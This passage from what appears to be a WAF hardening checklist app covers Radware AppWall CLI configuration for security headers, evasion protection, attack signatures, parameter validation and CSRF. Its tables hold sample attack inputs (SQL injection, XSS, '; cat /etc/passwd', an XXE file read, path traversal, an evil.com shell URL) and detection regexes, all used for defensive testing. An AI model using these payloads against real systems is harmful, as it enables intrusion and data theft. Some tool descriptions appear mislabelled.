                            <div><span class="code-command">header</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"Content-Security-Policy"</span> <span class="code-param">value</span> <span class="code-value">"default-src 'self'; script-src 'self' https://trusted-cdn.com;"</span></div>
                            <div><span class="code-command">header</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"X-XSS-Protection"</span> <span class="code-param">value</span> <span class="code-value">"1; mode=block"</span></div>
                            <div><span class="code-command">header</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"X-Frame-Options"</span> <span class="code-param">value</span> <span class="code-value">"SAMEORIGIN"</span></div>
                            <div><span class="code-command">header</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"X-Content-Type-Options"</span> <span class="code-param">value</span> <span class="code-value">"nosniff"</span></div>
                            <div><span class="code-command">header</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"Strict-Transport-Security"</span> <span class="code-param">value</span> <span class="code-value">"max-age=31536000; includeSubDomains"</span></div>
                            <div><span class="code-command">header</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"Referrer-Policy"</span> <span class="code-param">value</span> <span class="code-value">"strict-origin-when-cross-origin"</span></div>
                            <div><span class="code-command">header</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"Permissions-Policy"</span> <span class="code-param">value</span> <span class="code-value">"camera=(), microphone=(), geolocation=(self)"</span></div>
                            <div><span class="code-command">commit</span></div>
                            <div><span class="code-command">exit</span></div>
                        </div>
                        
                        <h5 class="font-semibold mb-2 mt-4 text-gray-800">Security Header Descriptions</h5>
                        <ul class="list-disc pl-6 mb-4 text-gray-700">
                            <li><strong>Content-Security-Policy (CSP):</strong> Restricts sources of content, preventing XSS and data injection attacks</li>
                            <li><strong>X-XSS-Protection:</strong> Enables browser's built-in XSS filter</li>
                            <li><strong>X-Frame-Options:</strong> Prevents clickjacking by controlling iframe embedding</li>
                            <li><strong>X-Content-Type-Options:</strong> Prevents MIME type sniffing and content-type confusion attacks</li>
                            <li><strong>Strict-Transport-Security (HSTS):</strong> Forces HTTPS connections</li>
                            <li><strong>Referrer-Policy:</strong> Controls information sent in the Referer header</li>
                            <li><strong>Permissions-Policy:</strong> Controls browser feature permissions</li>
                        </ul>
                    `
                },
                {
                    title: 'HTTP Evasion Techniques Protection',
                    content: `
                        <p class="mb-4 text-gray-700">Configure protection against various encoding and evasion techniques used to bypass security controls.</p>
                        
                        <div class="code-block">
                            <div class="code-comment"># Configure protection against evasion techniques</div>
                            <div><span class="code-command">configure</span> terminal</div>
                            <div><span class="code-command">appwall</span></div>
                            <div><span class="code-command">policy</span> <span class="code-value">"Web-Portal"</span></div>
                            <div><span class="code-command">evasion-protection</span></div>
                            <div><span class="code-param">url-decoding-passes</span> <span class="code-value">3</span></div>
                            <div><span class="code-param">unicode-normalization</span> <span class="code-value">enable</span></div>
                            <div><span class="code-param">null-byte-protection</span> <span class="code-value">enable</span></div>
                            <div><span class="code-param">backslash-normalization</span> <span class="code-value">enable</span></div>
                            <div><span class="code-param">case-insensitive-matching</span> <span class="code-value">enable</span></div>
                            <div><span class="code-param">alternative-encoding-detection</span> <span class="code-value">enable</span></div>
                            <div><span class="code-param">path-normalization</span> <span class="code-value">enable</span></div>
                            <div><span class="code-command">commit</span></div>
                            <div><span class="code-command">exit</span></div>
                        </div>
                        
                        <h5 class="font-semibold mb-2 mt-4 text-gray-800">Common Evasion Techniques</h5>
                        <p class="mb-4 text-gray-700">Examples of encoding and evasion techniques that attackers use to bypass security filters:</p>
                        
                        <table class="w-full text-left border-collapse mb-6">
                            <thead>
                                <tr>
                                    <th class="p-3 border bg-gray-100">Technique</th>
                                    <th class="p-3 border bg-gray-100">Example</th>
                                    <th class="p-3 border bg-gray-100">Description</th>
                                </tr>
                            </thead>
                            <tbody>
                                <tr>
                                    <td class="p-3 border">URL Encoding</td>
                                    <td class="p-3 border"><code>%3Cscript%3E</code></td>
                                    <td class="p-3 border">Encoding &lt;script&gt; as hex values</td>
                                </tr>
                                <tr>
                                    <td class="p-3 border">Double Encoding</td>
                                    <td class="p-3 border"><code>%253Cscript%253E</code></td>
                                    <td class="p-3 border">Encoding the % character itself</td>
                                </tr>
                                <tr>
                                    <td class="p-3 border">Unicode Encoding</td>
                                    <td class="p-3 border"><code>\\u003Cscript\\u003E</code></td>
                                    <td class="p-3 border">Using Unicode representation</td>
                                </tr>
                                <tr>
                                    <td class="p-3 border">Alternative UTF-8</td>
                                    <td class="p-3 border"><code>%C0%BC</code></td>
                                    <td class="p-3 border">Overlong UTF-8 encoding</td>
                                </tr>
                                <tr>
                                    <td class="p-3 border">Null Byte Injection</td>
                                    <td class="p-3 border"><code>script%00.jpg</code></td>
                                    <td class="p-3 border">Using null bytes to truncate strings</td>
                                </tr>
                                <tr>
                                    <td class="p-3 border">Path Traversal Variants</td>
                                    <td class="p-3 border"><code>..%c0%af..%c0%af</code></td>
                                    <td class="p-3 border">Alternate separator encoding</td>
                                </tr>
                            </tbody>
                        </table>
                    `
                }
            ],
            tools: [
                {
                    title: 'HTTP Request Validator',
                    icon: 'fa-exchange-alt',
                    description: 'Tools for testing HTTP compliance and headers in requests and responses.',
                    link: 'https://webhook.site/',
                    linkText: 'Webhook.site'
                },
                {
                    title: 'Security Headers Scanner',
                    icon: 'fa-search',
                    description: 'Analyze HTTP response headers for security best practices.',
                    link: 'https://securityheaders.com/',
                    linkText: 'SecurityHeaders.com'
                },
                {
                    title: 'CSP Evaluator',
                    icon: 'fa-shield-alt',
                    description: 'Validate Content Security Policy effectiveness and find weaknesses.',
                    link: 'https://csp-evaluator.withgoogle.com/',
                    linkText: 'CSP Evaluator'
                },
                {
                    title: 'HTTP Request Smuggler',
                    icon: 'fa-bug',
                    description: 'Test for HTTP request smuggling vulnerabilities.',
                    link: 'https://portswigger.net/web-security/request-smuggling',
                    linkText: 'PortSwigger Tool'
                }
            ]
        },
        {
            id: 'signatures',
            title: '5. Attack Signature Configuration',
            subtitle: 'Tuning pre-built attack signatures and managing false positives',
            icon: 'fa-shield-virus',
            priority: 'critical',
            progress: 44,
            checklist: [
                {
                    title: '5.1 Signature Policy',
                    icon: 'fa-file-signature',
                    items: [
                        { id: '5.1.1', text: 'Configure signature policy sensitivity level', priority: 'critical' },
                        { id: '5.1.2', text: 'Set up automated signature updates', priority: 'high' },
                        { id: '5.1.3', text: 'Create application-specific signature sets', priority: 'high' },
                        { id: '5.1.4', text: 'Configure signature response actions (alert, block)', priority: 'critical' },
                        { id: '5.1.5', text: 'Set up signature threat categories to enforce', priority: 'high' },
                        { id: '5.1.6', text: 'Configure signature testing/staging environment', priority: 'medium' },
                        { id: '5.1.7', text: 'Enable real-time signature deployment', priority: 'medium' }
                    ]
                },
                {
                    title: '5.2 Signature Tuning',
                    icon: 'fa-sliders-h',
                    items: [
                        { id: '5.2.1', text: 'Review and address signature false positives', priority: 'critical' },
                        { id: '5.2.2', text: 'Configure URI-specific signature exceptions', priority: 'high' },
                        { id: '5.2.3', text: 'Set up parameter-specific signature exceptions', priority: 'high' },
                        { id: '5.2.4', text: 'Create source IP-based signature exceptions', priority: 'medium' },
                        { id: '5.2.5', text: 'Implement signature thresholds for varied applications', priority: 'medium' },
                        { id: '5.2.6', text: 'Document all signature exceptions with justification', priority: 'medium' },
                        { id: '5.2.7', text: 'Configure cookie-specific signature validations', priority: 'high' },
                        { id: '5.2.8', text: 'Set up header-specific signature validations', priority: 'high' }
                    ]
                },
                {
                    title: '5.3 Custom Signatures',
                    icon: 'fa-fingerprint',
                    items: [
                        { id: '5.3.1', text: 'Create custom signatures for application-specific threats', priority: 'high' },
                        { id: '5.3.2', text: 'Develop patterns for business logic attack detection', priority: 'high' },
                        { id: '5.3.3', text: 'Configure regex-based attack pattern matching', priority: 'medium' },
                        { id: '5.3.4', text: 'Test and validate custom signature effectiveness', priority: 'high' },
                        { id: '5.3.5', text: 'Create signatures for known application vulnerabilities', priority: 'critical' },
                        { id: '5.3.6', text: 'Document all custom signatures with purpose and logic', priority: 'medium' },
                        { id: '5.3.7', text: 'Implement custom evasion detection signatures', priority: 'high' },
                        { id: '5.3.8', text: 'Create correlating signatures for multi-stage attacks', priority: 'high' }
                    ]
                },
                {
                    title: '5.4 Attack Type Coverage',
                    icon: 'fa-bug',
                    items: [
                        { id: '5.4.1', text: 'Verify SQL Injection signature coverage', priority: 'critical' },
                        { id: '5.4.2', text: 'Confirm Cross-Site Scripting (XSS) detection', priority: 'critical' },
                        { id: '5.4.3', text: 'Validate command injection protection', priority: 'critical' },
                        { id: '5.4.4', text: 'Ensure XXE (XML External Entity) attack detection', priority: 'high' },
                        { id: '5.4.5', text: 'Check SSRF (Server-Side Request Forgery) protection', priority: 'high' },
                        { id: '5.4.6', text: 'Verify Local File Inclusion (LFI) detection', priority: 'high' },
                        { id: '5.4.7', text: 'Test Remote File Inclusion (RFI) signature coverage', priority: 'high' },
                        { id: '5.4.8', text: 'Validate LDAP injection detection', priority: 'medium' },
                        { id: '5.4.9', text: 'Test protection against template injection attacks', priority: 'high' },
                        { id: '5.4.10', text: 'Verify deserialization attack protection', priority: 'high' }
                    ]
                }
            ],
            techniques: [
                {
                    title: 'Signature Policy Configuration',
                    content: `
                        <p class="mb-4 text-gray-700">Configure signature policy with appropriate sensitivity and update settings.</p>
                        
                        <div class="code-block">
                            <div class="code-comment"># Configure signature policy</div>
                            <div><span class="code-command">configure</span> terminal</div>
                            <div><span class="code-command">appwall</span></div>
                            <div><span class="code-command">policy</span> <span class="code-value">"Web-Portal"</span></div>
                            <div><span class="code-command">attack-signatures</span></div>
                            <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                            <div><span class="code-param">sensitivity</span> <span class="code-value">medium</span></div>
                            <div><span class="code-param">action</span> <span class="code-value">block</span></div>
                            <div><span class="code-param">update-automatically</span> <span class="code-value">yes</span></div>
                            <div><span class="code-param">update-frequency</span> <span class="code-value">daily</span></div>
                            <div><span class="code-param">update-time</span> <span class="code-value">03:00</span></div>
                            <div class="code-comment"># Enable specific attack categories</div>
                            <div><span class="code-command">category</span> <span class="code-value">"sql-injection"</span> <span class="code-param">state</span> <span class="code-value">enable</span> <span class="code-param">sensitivity</span> <span class="code-value">high</span></div>
                            <div><span class="code-command">category</span> <span class="code-value">"cross-site-scripting"</span> <span class="code-param">state</span> <span class="code-value">enable</span> <span class="code-param">sensitivity</span> <span class="code-value">high</span></div>
                            <div><span class="code-command">category</span> <span class="code-value">"command-injection"</span> <span class="code-param">state</span> <span class="code-value">enable</span> <span class="code-param">sensitivity</span> <span class="code-value">high</span></div>
                            <div><span class="code-command">category</span> <span class="code-value">"path-traversal"</span> <span class="code-param">state</span> <span class="code-value">enable</span> <span class="code-param">sensitivity</span> <span class="code-value">high</span></div>
                            <div><span class="code-command">category</span> <span class="code-value">"xml-attacks"</span> <span class="code-param">state</span> <span class="code-value">enable</span> <span class="code-param">sensitivity</span> <span class="code-value">medium</span></div>
                            <div><span class="code-command">commit</span></div>
                            <div><span class="code-command">exit</span></div>
                        </div>
                    `
                },
                {
                    title: 'Signature Tuning and False Positive Management',
                    content: `
                        <p class="mb-4 text-gray-700">Configure exceptions to reduce false positives while maintaining security.</p>
                        
                        <div class="code-block">
                            <div class="code-comment"># Configure signature exceptions</div>
                            <div><span class="code-command">configure</span> terminal</div>
                            <div><span class="code-command">appwall</span></div>
                            <div><span class="code-command">policy</span> <span class="code-value">"Web-Portal"</span></div>
                            <div><span class="code-command">attack-signatures</span></div>
                            <div><span class="code-command">exception</span> <span class="code-value">add</span> <span class="code-param">signature-id</span> <span class="code-value">12345</span> <span class="code-param">url</span> <span class="code-value">"/api/code-examples"</span> <span class="code-param">parameter</span> <span class="code-value">"code"</span></div>
                            <div><span class="code-command">exception</span> <span class="code-value">add</span> <span class="code-param">category</span> <span class="code-value">"sql-injection"</span> <span class="code-param">url</span> <span class="code-value">"/admin/reports"</span> <span class="code-param">parameter</span> <span class="code-value">"query"</span></div>
                            <div class="code-comment"># Add exception documentation</div>
                            <div><span class="code-command">exception</span> <span class="code-value">12345</span></div>
                            <div><span class="code-param">description</span> <span class="code-value">"Code examples page legitimately contains code samples with SQL syntax"</span></div>
                            <div><span class="code-param">expiration</span> <span class="code-value">"2025-12-31"</span></div>
                            <div><span class="code-param">owner</span> <span class="code-value">"security-admin"</span></div>
                            <div><span class="code-param">ticket-id</span> <span class="code-value">"SEC-2025-0123"</span></div>
                            <div><span class="code-command">commit</span></div>
                            <div><span class="code-command">exit</span></div>
                        </div>
                        
                        <h5 class="font-semibold mb-2 mt-4 text-gray-800">Managing False Positives Systematically</h5>
                        <p class="mb-4 text-gray-700">Effective WAF deployments require a process for reviewing and addressing false positives.</p>
                        
                        <ol class="list-decimal pl-6 mb-4 text-gray-700">
                            <li class="mb-2">Review WAF logs for blocked legitimate traffic</li>
                            <li class="mb-2">Identify signature ID causing the false positive</li>
                            <li class="mb-2">Analyze the context (URL, parameter, payload) triggering the signature</li>
                            <li class="mb-2">Create the most specific exception possible (avoid broad exceptions)</li>
                            <li class="mb-2">Document the exception with clear justification</li>
                            <li class="mb-2">Set an expiration date for reviewing the exception</li>
                            <li class="mb-2">Test the exception to confirm legitimate traffic passes</li>
                            <li>Monitor for potential security impact of the exception</li>
                        </ol>
                    `
                },
                {
                    title: 'Custom Signature Development',
                    content: `
                        <p class="mb-4 text-gray-700">Create custom attack signatures for application-specific vulnerabilities and threats.</p>
                        
                        <div class="code-block">
                            <div class="code-comment"># Create custom attack signatures</div>
                            <div><span class="code-command">configure</span> terminal</div>
                            <div><span class="code-command">appwall</span></div>
                            <div><span class="code-command">policy</span> <span class="code-value">"Web-Portal"</span></div>
                            <div><span class="code-command">attack-signatures</span></div>
                            <div><span class="code-command">custom-signature</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"Custom-SQLi-Legacy-App"</span></div>
                            <div><span class="code-command">custom-signature</span> <span class="code-value">"Custom-SQLi-Legacy-App"</span></div>
                            <div><span class="code-param">pattern</span> <span class="code-value">"\\b(exec|execute|exec sp_|sp_executesql|xp_cmdshell)\\b"</span></div>
                            <div><span class="code-param">category</span> <span class="code-value">"sql-injection"</span></div>
                            <div><span class="code-param">description</span> <span class="code-value">"Custom signature to detect stored procedure execution attempts in legacy application"</span></div>
                            <div><span class="code-param">risk</span> <span class="code-value">high</span></div>
                            <div><span class="code-param">accuracy</span> <span class="code-value">medium</span></div>
                            <div><span class="code-command">exit</span></div>
                            
                            <div class="code-comment"># Create evasion detection signature</div>
                            <div><span class="code-command">custom-signature</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"Obfuscated-JS-Detection"</span></div>
                            <div><span class="code-command">custom-signature</span> <span class="code-value">"Obfuscated-JS-Detection"</span></div>
                            <div><span class="code-param">pattern</span> <span class="code-value">"(?:\\\\x[0-9a-f]{2}|\\\\u[0-9a-f]{4}){10,}"</span></div>
                            <div><span class="code-param">category</span> <span class="code-value">"cross-site-scripting"</span></div>
                            <div><span class="code-param">description</span> <span class="code-value">"Detects heavily encoded JavaScript potentially attempting to evade filters"</span></div>
                            <div><span class="code-param">risk</span> <span class="code-value">high</span></div>
                            <div><span class="code-param">accuracy</span> <span class="code-value">high</span></div>
                            <div><span class="code-command">commit</span></div>
                            <div><span class="code-command">exit</span></div>
                        </div>
                        
                        <h5 class="font-semibold mb-2 mt-4 text-gray-800">Custom Signature Best Practices</h5>
                        <ul class="list-disc pl-6 mb-4 text-gray-700">
                            <li class="mb-2">Use specific patterns to minimize false positives</li>
                            <li class="mb-2">Include context awareness (where the pattern appears)</li>
                            <li class="mb-2">Test signatures thoroughly with both attack and legitimate traffic</li>
                            <li class="mb-2">Document intent, logic, and any limitations of the signature</li>
                            <li class="mb-2">Consider the performance impact of complex regex patterns</li>
                            <li>Implement a review cycle to validate and improve custom signatures</li>
                        </ul>
                    `
                },
                {
                    title: 'Attack Type Coverage Matrix',
                    content: `
                        <p class="mb-4 text-gray-700">Comprehensive protection against common web application attacks requires signature coverage for multiple attack vectors.</p>
                        
                        <table class="w-full text-left border-collapse mb-6">
                            <thead>
                                <tr>
                                    <th class="p-3 border bg-gray-100">Attack Type</th>
                                    <th class="p-3 border bg-gray-100">Description</th>
                                    <th class="p-3 border bg-gray-100">Sample Attack Pattern</th>
                                    <th class="p-3 border bg-gray-100">Signature Configuration</th>
                                </tr>
                            </thead>
                            <tbody>
                                <tr>
                                    <td class="p-3 border">SQL Injection</td>
                                    <td class="p-3 border">Inserting malicious SQL code to manipulate databases</td>
                                    <td class="p-3 border"><code>' OR 1=1 --</code></td>
                                    <td class="p-3 border">Enable SQL injection signatures with high sensitivity</td>
                                </tr>
                                <tr>
                                    <td class="p-3 border">Cross-Site Scripting (XSS)</td>
                                    <td class="p-3 border">Injecting client-side scripts into web pages</td>
                                    <td class="p-3 border"><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></td>
                                    <td class="p-3 border">Enable XSS signatures with character set validations</td>
                                </tr>
                                <tr>
                                    <td class="p-3 border">Command Injection</td>
                                    <td class="p-3 border">Executing OS commands on the server</td>
                                    <td class="p-3 border"><code>; cat /etc/passwd</code></td>
                                    <td class="p-3 border">Enable command injection signatures with special character detection</td>
                                </tr>
                                <tr>
                                    <td class="p-3 border">XML External Entity (XXE)</td>
                                    <td class="p-3 border">Exploiting XML parsers to access server files</td>
                                    <td class="p-3 border"><code>&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;</code></td>
                                    <td class="p-3 border">Enable XML attack signatures and DTD validation</td>
                                </tr>
                                <tr>
                                    <td class="p-3 border">Server-Side Request Forgery (SSRF)</td>
                                    <td class="p-3 border">Forcing server to make unintended requests</td>
                                    <td class="p-3 border"><code>http://internal-server/admin</code></td>
                                    <td class="p-3 border">Enable URL validation and internal resource access signatures</td>
                                </tr>
                                <tr>
                                    <td class="p-3 border">Local File Inclusion (LFI)</td>
                                    <td class="p-3 border">Including local files in application</td>
                                    <td class="p-3 border"><code>../../../etc/passwd</code></td>
                                    <td class="p-3 border">Enable path traversal signatures with normalization</td>
                                </tr>
                                <tr>
                                    <td class="p-3 border">Remote File Inclusion (RFI)</td>
                                    <td class="p-3 border">Including remote malicious files</td>
                                    <td class="p-3 border"><code>http://evil.com/shell.php</code></td>
                                    <td class="p-3 border">Enable RFI signatures with URL validations</td>
                                </tr>
                                <tr>
                                    <td class="p-3 border">Deserialization Attacks</td>
                                    <td class="p-3 border">Exploiting serialized objects</td>
                                    <td class="p-3 border"><code>O:8:"Example":1:{...}</code></td>
                                    <td class="p-3 border">Enable custom deserialization attack signatures</td>
                                </tr>
                            </tbody>
                        </table>
                        
                        <div class="code-block">
                            <div class="code-comment"># Enable comprehensive attack coverage</div>
                            <div><span class="code-command">configure</span> terminal</div>
                            <div><span class="code-command">appwall</span></div>
                            <div><span class="code-command">policy</span> <span class="code-value">"Web-Portal"</span></div>
                            <div><span class="code-command">attack-signatures</span></div>
                            <div><span class="code-command">category</span> <span class="code-value">"sql-injection"</span> <span class="code-param">state</span> <span class="code-value">enable</span> <span class="code-param">sensitivity</span> <span class="code-value">high</span></div>
                            <div><span class="code-command">category</span> <span class="code-value">"cross-site-scripting"</span> <span class="code-param">state</span> <span class="code-value">enable</span> <span class="code-param">sensitivity</span> <span class="code-value">high</span></div>
                            <div><span class="code-command">category</span> <span class="code-value">"command-execution"</span> <span class="code-param">state</span> <span class="code-value">enable</span> <span class="code-param">sensitivity</span> <span class="code-value">high</span></div>
                            <div><span class="code-command">category</span> <span class="code-value">"xml-attacks"</span> <span class="code-param">state</span> <span class="code-value">enable</span> <span class="code-param">sensitivity</span> <span class="code-value">high</span></div>
                            <div><span class="code-command">category</span> <span class="code-value">"ssrf"</span> <span class="code-param">state</span> <span class="code-value">enable</span> <span class="code-param">sensitivity</span> <span class="code-value">medium</span></div>
                            <div><span class="code-command">category</span> <span class="code-value">"path-traversal"</span> <span class="code-param">state</span> <span class="code-value">enable</span> <span class="code-param">sensitivity</span> <span class="code-value">high</span></div>
                            <div><span class="code-command">category</span> <span class="code-value">"remote-file-inclusion"</span> <span class="code-param">state</span> <span class="code-value">enable</span> <span class="code-param">sensitivity</span> <span class="code-value">high</span></div>
                            <div><span class="code-command">category</span> <span class="code-value">"deserialization"</span> <span class="code-param">state</span> <span class="code-value">enable</span> <span class="code-param">sensitivity</span> <span class="code-value">medium</span></div>
                            <div><span class="code-command">commit</span></div>
                            <div><span class="code-command">exit</span></div>
                        </div>
                    `
                }
            ],
            tools: [
                {
                    title: 'Attack Signature Testing Tool',
                    icon: 'fa-vial',
                    description: 'Test signature effectiveness against both attack payloads and legitimate traffic.',
                    link: 'https://github.com/OWASP/Amass',
                    linkText: 'OWASP Amass'
                },
                {
                    title: 'False Positive Analyzer',
                    icon: 'fa-filter',
                    description: 'Analyze WAF logs to identify and address false positive triggers.',
                    link: 'https://www.elastic.co/kibana',
                    linkText: 'Kibana'
                },
                {
                    title: 'Payload Generator',
                    icon: 'fa-code',
                    description: 'Generate attack payloads for testing WAF signature effectiveness.',
                    link: 'https://github.com/swisskyrepo/PayloadsAllTheThings',
                    linkText: 'PayloadsAllTheThings'
                },
                {
                    title: 'Signature Update Monitor',
                    icon: 'fa-bell',
                    description: 'Monitor for new attack signatures and security updates from Radware.',
                    link: 'https://www.radware.com/security-updates/',
                    linkText: 'Radware Security'
                }
            ]
        },
        {
            id: 'custom-rules',
            title: '6. Custom Security Rules',
            subtitle: 'Building application-specific protections and custom filters',
            icon: 'fa-code',
            priority: 'high',
            progress: 0,
            checklist: [
                {
                    title: '6.1 Rule Development',
                    icon: 'fa-pencil-ruler',
                    items: [
                        { id: '6.1.1', text: 'Create custom security rules based on application logic', priority: 'high' },
                        { id: '6.1.2', text: 'Develop parameter validation rules (format, length, type)', priority: 'critical' },
                        { id: '6.1.3', text: 'Configure correlation rules for complex attack patterns', priority: 'high' },
                        { id: '6.1.4', text: 'Set up rate limiting for specific application functions', priority: 'medium' },
                        { id: '6.1.5', text: 'Create transaction validation rules (multi-request)', priority: 'high' },
                        { id: '6.1.6', text: 'Implement regex-based pattern matching for application data', priority: 'high' },
                        { id: '6.1.7', text: 'Define rules for sensitive operation protection', priority: 'critical' }
                    ]
                },
                {
                    title: '6.2 Rule Testing and Optimization',
                    icon: 'fa-vial',
                    items: [
                        { id: '6.2.1', text: 'Test custom rules against legitimate traffic', priority: 'critical' },
                        { id: '6.2.2', text: 'Validate rule effectiveness against attack scenarios', priority: 'high' },
                        { id: '6.2.3', text: 'Monitor rule performance impact', priority: 'medium' },
                        { id: '6.2.4', text: 'Optimize rule execution order for performance', priority: 'medium' },
                        { id: '6.2.5', text: 'Document rule purpose, logic, and expected behavior', priority: 'high' },
                        { id: '6.2.6', text: 'Implement rule versioning and change management', priority: 'medium' },
                        { id: '6.2.7', text: 'Create automated rule testing framework', priority: 'medium' }
                    ]
                },
                {
                    title: '6.3 Advanced Rule Applications',
                    icon: 'fa-puzzle-piece',
                    items: [
                        { id: '6.3.1', text: 'Create data leakage prevention rules', priority: 'high' },
                        { id: '6.3.2', text: 'Set up application logic defenses (anti-CSRF, workflow)', priority: 'critical' },
                        { id: '6.3.3', text: 'Configure virtual patching for known vulnerabilities', priority: 'critical' },
                        { id: '6.3.4', text: 'Implement API-specific security rules', priority: 'high' },
                        { id: '6.3.5', text: 'Create environment-specific rule variations (dev/test/prod)', priority: 'medium' },
                        { id: '6.3.6', text: 'Implement behavioral analysis rules', priority: 'high' },
                        { id: '6.3.7', text: 'Configure custom error detection and prevention', priority: 'medium' },
                        { id: '6.3.8', text: 'Create rules for legacy application protection', priority: 'high' }
                    ]
                }
            ],
            techniques: [
                {
                    title: 'Custom Parameter Validation Rules',
                    content: `
                        <p class="mb-4 text-gray-700">Create validation rules for application parameters to prevent injection attacks and parameter tampering.</p>
                        
                        <div class="code-block">
                            <div class="code-comment"># Configure parameter validation rules</div>
                            <div><span class="code-command">configure</span> terminal</div>
                            <div><span class="code-command">appwall</span></div>
                            <div><span class="code-command">policy</span> <span class="code-value">"Web-Portal"</span></div>
                            <div><span class="code-command">parameter-validation</span></div>
                            <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                            <div class="code-comment"># Create parameter type definitions</div>
                            <div><span class="code-command">parameter-type</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"user-id"</span></div>
                            <div><span class="code-command">parameter-type</span> <span class="code-value">"user-id"</span></div>
                            <div><span class="code-param">pattern</span> <span class="code-value">"^[A-Za-z0-9_-]{3,20}$"</span></div>
                            <div><span class="code-param">description</span> <span class="code-value">"Alphanumeric username, 3-20 chars"</span></div>
                            <div><span class="code-command">exit</span></div>
                            <div class="code-comment"># Create parameter validation rule</div>
                            <div><span class="code-command">parameter</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"username"</span> <span class="code-param">type</span> <span class="code-value">"user-id"</span> <span class="code-param">enforcement</span> <span class="code-value">mandatory</span></div>
                            <div><span class="code-command">parameter</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"email"</span> <span class="code-param">type</span> <span class="code-value">"email"</span> <span class="code-param">enforcement</span> <span class="code-value">mandatory</span></div>
                            <div><span class="code-command">parameter</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"account-id"</span> <span class="code-param">type</span> <span class="code-value">"integer"</span> <span class="code-param">min-value</span> <span class="code-value">1000</span> <span class="code-param">max-value</span> <span class="code-value">9999999</span></div>
                            <div><span class="code-command">parameter</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"comment"</span> <span class="code-param">type</span> <span class="code-value">"text"</span> <span class="code-param">max-length</span> <span class="code-value">1000</span> <span class="code-param">allowed-metacharacters</span> <span class="code-value">".,!?()-"</span></div>
                            <div><span class="code-command">commit</span></div>
                            <div><span class="code-command">exit</span></div>
                        </div>
                        
                        <h5 class="font-semibold mb-2 mt-4 text-gray-800">Parameter Validation Strategies</h5>
                        <p class="mb-4 text-gray-700">Effective parameter validation should implement multiple layers of protection:</p>
                        <ul class="list-disc pl-6 mb-4 text-gray-700">
                            <li class="mb-2"><strong>Positive Validation:</strong> Define exactly what's allowed rather than what's forbidden</li>
                            <li class="mb-2"><strong>Type Enforcement:</strong> Validate data types (numeric, alphanumeric, date, etc.)</li>
                            <li class="mb-2"><strong>Range Checking:</strong> Enforce minimum/maximum values and lengths</li>
                            <li class="mb-2"><strong>Character Set Limitations:</strong> Restrict to only necessary characters</li>
                            <li class="mb-2"><strong>Format Validation:</strong> Enforce specific formats (email, phone, etc.)</li>
                            <li><strong>Required Parameters:</strong> Ensure required fields are present</li>
                        </ul>
                    `
                },
                {
                    title: 'Anti-CSRF Protection Rules',
                    content: `
                        <p class="mb-4 text-gray-700">Configure Cross-Site Request Forgery (CSRF) protection to prevent attackers from forcing users to perform unwanted actions.</p>
                        
                        <div class="code-block">
                            <div class="code-comment"># Configure CSRF protection</div>
                            <div><span class="code-command">configure</span> terminal</div>
                            <div><span class="code-command">appwall</span></div>
                            <div><span class="code-command">policy</span> <span class="code-value">"Web-Portal"</span></div>
                            <div><span class="code-command">csrf-protection</span></div>
                            <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                            <div><span class="code-param">enforcement</span> <span class="code-value">block</span></div>
                            <div class="code-comment"># Configure CSRF token settings</div>
                            <div><span class="code-param">token-name</span> <span class="code-value">"csrf_token"</span></div>
                            <div><span class="code-param">token-location</span> <span class="code-value">"header,parameter"</span></div>
                            <div><span class="code-param">token-format</span> <span class="code-value">"alphanumeric"</span></div>
                            <div><span class="code-param">token-length</span> <span class="code-value">32</span></div>
                            <div class="code-comment"># Define protected URLs (POST endpoints that modify state)</div>
                            <div><span class="code-command">protected-url</span> <span class="code-value">add</span> <span class="code-param">url</span> <span class="code-value">"/api/user/update"</span> <span class="code-param">methods</span> <span class="code-value">"POST,PUT"</span></div>
                            <div><span class="code-command">protected-url</span> <span class="code-value">add</span> <span class="code-param">url</span> <span class="code-value">"/admin/*"</span> <span class="code-param">methods</span> <span class="code-value">"POST,PUT,DELETE"</span></div>
                            <div><span class="code-command">protected-url</span> <span class="code-value">add</span> <span class="code-param">url</span> <span class="code-value">"/user/settings"</span> <span class="code-param">methods</span> <span class="code-value">"POST"</span></div>
                            <div class="code-comment"># Add exemptions for specific APIs</div>
                            <div><span class="code-command">exemption</span> <span class="code-value">add</span> <span class="code-param">url</span> <span class="code-value">"/api/webhook/callback"</span></div>
                            <div><span class="code-command">commit</span></div>
                            <div><span class="code-command">exit</span></div>
                        </div>
                        
                        <h5 class="font-semibold mb-2 mt-4 text-gray-800">CSRF Protection Strategies</h5>
                        <p class="mb-4 text-gray-700">Comprehensive CSRF protection combines multiple security mechanisms:</p>
                        <ul class="list-disc pl-6 mb-4 text-gray-700">
                            <li class="mb-2"><strong>Token Validation:</strong> Unique tokens for each session/user</li>
                            <li class="mb-2"><strong>Referer Validation:</strong> Verify requests come from your domain</li>
                            <li class="mb-2"><strong>SameSite Cookies:</strong> Configure cookies with SameSite=Strict/Lax</li>
                            <li class="mb-2"><strong>Custom Headers:</strong> Require custom headers on sensitive requests</li>
                            <li><strong>Form-Specific Tokens:</strong> Unique tokens for different forms/actions</li>
                        </ul>
                    `
                },
                {
                    title: 'Virtual Patching Rules',
                    content: `
                        <p class="mb-4 text-gray-700">Implement virtual patches to protect against known vulnerabilities without modifying application code.</p>
                        
                        <div class="code-block">
                            <div class="code-comment"># Configure virtual patching for a known vulnerability</div>
                            <div><span class="code-command">configure</span> terminal</div>
                            <div><span class="code-command">appwall</span></div>
                            <div><span class="code-command">policy</span> <span class="code-value">"Web-Portal"</span></div>
